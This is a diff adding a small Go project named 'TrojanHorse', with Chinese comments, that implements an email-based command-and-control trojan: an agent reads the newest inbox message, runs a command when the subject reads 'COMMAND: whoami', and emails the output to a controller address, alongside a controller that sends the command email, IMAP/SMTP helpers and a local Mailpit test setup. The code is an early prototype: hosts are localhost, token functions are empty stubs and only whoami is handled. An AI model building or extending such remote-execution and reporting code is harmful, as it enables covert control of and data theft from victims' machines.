@@ -1,0 +1,365 @@
+子文件夹：./config
+文件：./config/config.yaml
+内容：
+# 邮箱配置
+smtp:
+  host: localhost
+  port: 8024
+  username: your_email@example.com
+  client_id: your_client_id
+  refresh_token: your_refresh_token
+
+imap:
+  host: localhost
+  port: 8024
+  username: your_email@example.com
+  client_id: your_client_id
+  refresh_token: your_refresh_token
+
+control_email: controller@localhost
+agent_email: agent@localhost
+
+
+子文件夹：./email
+文件：./email/imap.go
+内容：
+package email
+
+import (
+	_ "log"
+
+	"github.com/emersion/go-imap"
+	"github.com/emersion/go-imap/client"
+	"golang.org/x/oauth2"
+)
+
+// IMAPClient 封装IMAP客户端功能
+type IMAPClient struct {
+	host         string
+	port         string
+	username     string
+	clientID     string
+	refreshToken string
+}
+
+// NewIMAPClient 创建新的IMAP客户端
+func NewIMAPClient(host, port, username, clientID, refreshToken string) *IMAPClient {
+	return &IMAPClient{
+		host:         host,
+		port:         port,
+		username:     username,
+		clientID:     clientID,
+		refreshToken: refreshToken,
+	}
+}
+
+// Connect 连接到IMAP服务器
+func (c *IMAPClient) Connect() (*client.Client, error) {
+	// 使用OAuth2认证
+	token := &oauth2.Token{
+		AccessToken: c.getAccessToken(),
+	}
+
+	// 连接到服务器
+	addr := c.host + ":" + c.port
+	imapClient, err := client.DialTLS(addr, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	// 登录
+	err = imapClient.Login(c.username, token.AccessToken)
+	if err != nil {
+		return nil, err
+	}
+
+	return imapClient, nil
+}
+
+// FetchEmails 获取新邮件
+func (c *IMAPClient) FetchEmails() ([]*imap.Message, error) {
+	imapClient, err := c.Connect()
+	if err != nil {
+		return nil, err
+	}
+	defer imapClient.Logout()
+
+	// 选择收件箱
+	mbox, err := imapClient.Select("INBOX", false)
+	if err != nil {
+		return nil, err
+	}
+
+	// 获取最新邮件
+	seqSet := new(imap.SeqSet)
+	seqSet.AddRange(mbox.Messages-10, mbox.Messages)
+
+	messages := make(chan *imap.Message, 10)
+	done := make(chan error, 1)
+	go func() {
+		done <- imapClient.Fetch(seqSet, []imap.FetchItem{imap.FetchEnvelope}, messages)
+	}()
+
+	var result []*imap.Message
+	for msg := range messages {
+		result = append(result, msg)
+	}
+
+	if err := <-done; err != nil {
+		return nil, err
+	}
+
+	return result, nil
+}
+
+// getAccessToken 获取OAuth2访问令牌
+func (c *IMAPClient) getAccessToken() string {
+	// TODO: 实现OAuth2令牌获取逻辑
+	return ""
+}
+
+文件：./email/smtp.go
+内容：
+package email
+
+import (
+	"github.com/jordan-wright/email"
+	"golang.org/x/oauth2"
+	_ "log"
+	"net/smtp"
+)
+
+// SMTPClient 封装SMTP客户端功能
+type SMTPClient struct {
+	host         string
+	port         string
+	username     string
+	clientID     string
+	refreshToken string
+}
+
+// NewSMTPClient 创建新的SMTP客户端
+func NewSMTPClient(host, port, username, clientID, refreshToken string) *SMTPClient {
+	return &SMTPClient{
+		host:         host,
+		port:         port,
+		username:     username,
+		clientID:     clientID,
+		refreshToken: refreshToken,
+	}
+}
+
+// SendEmail 发送邮件
+func (c *SMTPClient) SendEmail(to, subject, body string, attachments []string) error {
+	e := email.NewEmail()
+	e.From = c.username
+	e.To = []string{to}
+	e.Subject = subject
+	e.Text = []byte(body)
+
+	// 添加附件
+	for _, attachment := range attachments {
+		_, err := e.AttachFile(attachment)
+		if err != nil {
+			return err
+		}
+	}
+
+	// 使用OAuth2认证
+	token := &oauth2.Token{
+		AccessToken: c.getAccessToken(),
+	}
+	auth := smtp.PlainAuth("", c.username, token.AccessToken, c.host)
+
+	// 发送邮件
+	addr := c.host + ":" + c.port
+	return e.Send(addr, auth)
+}
+
+// getAccessToken 获取OAuth2访问令牌
+func (c *SMTPClient) getAccessToken() string {
+	// TODO: 实现OAuth2令牌获取逻辑
+	return ""
+}
+
+
+子文件夹：./main
+文件：./main/agent.go
+内容：
+package main
+
+import (
+	"TrojanHorse/email"
+	"fmt"
+	"os/exec"
+
+	"github.com/spf13/viper"
+)
+
+func agentmain() {
+	// 读取配置文件
+	viper.SetConfigFile("../config/config.yaml")
+	err := viper.ReadInConfig()
+	if err != nil {
+		panic(fmt.Errorf("无法读取配置文件: %s", err))
+	}
+
+	// 初始化IMAP客户端
+	imapClient := email.NewIMAPClient(
+		viper.GetString("imap.host"),
+		viper.GetString("imap.port"),
+		viper.GetString("imap.username"),
+		viper.GetString("imap.client_id"),
+		viper.GetString("imap.refresh_token"),
+	)
+
+	// 获取新邮件
+	messages, err := imapClient.FetchEmails()
+	if err != nil {
+		panic(fmt.Errorf("获取邮件失败: %s", err))
+	}
+
+	// 处理最新邮件
+	if len(messages) > 0 {
+		msg := messages[len(messages)-1]
+		if msg.Envelope.Subject == "COMMAND: whoami" {
+			// 执行命令
+			out, err := exec.Command("whoami").Output()
+			if err != nil {
+				panic(fmt.Errorf("执行命令失败: %s", err))
+			}
+
+			// 初始化SMTP客户端
+			smtpClient := email.NewSMTPClient(
+				viper.GetString("smtp.host"),
+				viper.GetString("smtp.port"),
+				viper.GetString("smtp.username"),
+				viper.GetString("smtp.client_id"),
+				viper.GetString("smtp.refresh_token"),
+			)
+
+			// 发送回显邮件
+			err = smtpClient.SendEmail(
+				viper.GetString("control_email"),
+				"RESULT: whoami",
+				string(out),
+				nil,
+			)
+			if err != nil {
+				panic(fmt.Errorf("发送回显邮件失败: %s", err))
+			}
+
+			fmt.Println("命令已执行并返回结果")
+		}
+	}
+}
+
+文件：./main/controller.go
+内容：
+package main
+
+import (
+	"TrojanHorse/email"
+	"fmt"
+
+	"github.com/spf13/viper"
+)
+
+func controllerMain() {
+	// 读取配置文件
+	viper.SetConfigFile("../config/config.yaml")
+	err := viper.ReadInConfig()
+	if err != nil {
+		panic(fmt.Errorf("无法读取配置文件: %s", err))
+	}
+
+	// 初始化SMTP客户端
+	smtpClient := email.NewSMTPClient(
+		viper.GetString("smtp.host"),
+		viper.GetString("smtp.port"),
+		viper.GetString("smtp.username"),
+		viper.GetString("smtp.client_id"),
+		viper.GetString("smtp.refresh_token"),
+	)
+
+	// 发送测试命令
+	err = smtpClient.SendEmail(
+		viper.GetString("agent_email"),
+		"COMMAND: whoami",
+		"这是测试命令",
+		nil,
+	)
+	if err != nil {
+		panic(fmt.Errorf("发送邮件失败: %s", err))
+	}
+
+	fmt.Println("命令邮件已成功发送")
+}
+
+文件：./output.txt
+内容：
+
+子文件夹：./scripts
+文件：./scripts/mail.sh
+内容：
+# This script is used to start the Mailpit service for local email testing.
+#!/usr/bin/env bash
+# Check if Mailpit is already running
+if pgrep -x "mailpit" > /dev/null; then
+    echo "Mailpit is already running."
+    exit 1
+fi
+
+# Start Mailpit
+
+mailpit --smtp :8024 --listen :8025
+
+文件：./test_send.go
+内容：
+package main
+
+import (
+	"TrojanHorse/email"
+	"fmt"
+	"os/exec"
+
+	"github.com/spf13/viper"
+)
+
+func main() {
+	// 读取配置文件
+	viper.SetConfigFile("./config/config.yaml")
+	err := viper.ReadInConfig()
+	if err != nil {
+		panic(fmt.Errorf("无法读取配置文件: %s", err))
+	}
+
+	// 初始化SMTP客户端
+	smtpClient := email.NewSMTPClient(
+		viper.GetString("smtp.host"),
+		viper.GetString("smtp.port"),
+		viper.GetString("smtp.username"),
+		viper.GetString("smtp.client_id"),
+		viper.GetString("smtp.refresh_token"),
+	)
+
+	// 执行whoami命令
+	out, err := exec.Command("whoami").Output()
+	if err != nil {
+		panic(fmt.Errorf("执行命令失败: %s", err))
+	}
+
+	// 发送测试邮件
+	err = smtpClient.SendEmail(
+		viper.GetString("control_email"),
+		"TEST: whoami",
+		string(out),
+		nil,
+	)
+	if err != nil {
+		panic(fmt.Errorf("发送邮件失败: %s", err))
+	}
+
+	fmt.Println("测试邮件已成功发送")
+}
+
